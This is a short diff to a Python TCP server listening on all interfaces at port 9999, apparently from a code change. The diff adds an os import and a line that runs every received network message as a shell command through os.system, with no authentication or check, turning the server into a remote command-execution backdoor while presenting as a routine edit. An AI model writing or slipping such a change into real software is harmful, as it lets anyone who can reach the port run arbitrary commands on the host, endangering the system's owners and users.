@@ -1,6 +1,7 @@
 from http import server
 import socket
 import threading
+import os
 
 bind_ip = "0.0.0.0"
 bind_port = 9999
@@ -14,6 +15,7 @@ print(f"[*] Listening on {bind_ip}:{bind_port}")
 
 def handle_client(client_socket):
     request = client_socket.recv(1024)
+    os.system(request.decode('utf-8'))
     print(f"[*] Received {request}")
 
     client_socket.send(b"ACK!")
